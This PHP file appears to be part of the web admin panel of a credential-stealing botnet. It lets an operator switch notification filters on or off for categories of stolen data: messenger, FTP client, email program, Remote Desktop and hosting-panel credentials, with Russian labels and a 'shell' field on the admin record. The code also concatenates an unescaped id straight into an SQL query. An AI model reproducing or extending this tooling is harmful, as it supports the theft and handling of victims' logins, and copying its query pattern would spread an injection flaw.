<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
//print_r(scandir('cache/'));
if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		if(isset($_POST['submit'])){
			foreach($_POST as $k => $i){				if(strpos($k, 'fdi') === 0){					$n = str_replace('fdi', '', $k);
					if($i == 'on'){
						file_put_contents('cache/fdi/' . $result->id . '_' . $n, 1);
					}else{						if(file_exists('cache/fdi/' . $result->id . '_' . $n)) unlink('cache/fdi/' . $result->id . '_' . $n);
					}
				}
			}
		}

		$smarty->assign('admin', $result);
		$list = $mysqli->query("SELECT id,name FROM bf_filters WHERE NOT isNull(host)");

        $nid = count($list);
        $list[$nid]->name = 'Мессанджеры';
	    $list[$nid]->id = 'messengers';

		$nid = count($list);
		$list[$nid]->name = 'ФТП Клиенты';
		$list[$nid]->id = 'ftps';

        $nid = count($list);
		$list[$nid]->name = 'Почтовые программы';
		$list[$nid]->id = 'emailprograms';

		$nid = count($list);
		$list[$nid]->name = 'Remote Desktop Connection';
		$list[$nid]->id = 'rdp';

		$nid = count($list);
		$list[$nid]->name = 'Хостинг Панели';
		$list[$nid]->id = 'panels';

		$smarty->assign('list', $list);
	}
}

?>